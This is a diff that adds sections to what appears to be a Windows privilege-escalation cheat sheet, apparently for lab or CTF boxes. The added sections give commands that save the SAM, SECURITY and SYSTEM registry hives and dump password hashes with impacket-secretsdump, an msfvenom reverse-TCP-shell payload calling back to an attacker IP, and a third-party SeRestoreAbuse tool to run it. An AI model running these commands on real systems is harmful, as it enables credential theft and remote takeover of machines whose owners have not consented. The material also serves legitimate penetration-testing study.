@@ -44,6 +44,28 @@ takeown /f "C:\path\to\file.txt"
 # Modify permissions to gain full access
 icacls "C:\path\to\file.txt" /grant username:F
 ```
+
+### SeBackupPrivilege
+> exfiltrate and dump hashes from hives
+```powershell
+# Save Hives
+reg save hklm\sam C:\temp\sam.hive
+reg save hklm\security C:\temp\security.hive
+reg save hklm\system C:\temp\system.hive
+
+# dump hashes
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+```
+### SeRestorePrivilege
+> exfiltrate and dump hashes from hives
+
+```powershell
+# Nice lil script
+https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.51 LPORT=80 -f exe -o reverse.exe
+./SeRestoreAbuse.exe <absolute path of reverse.exe>
+```
+
 ## Techniques d'élévation de privilèges Windows dans des Box
 ### Exploitation des groupes de sécurité
 Exemple (Return):
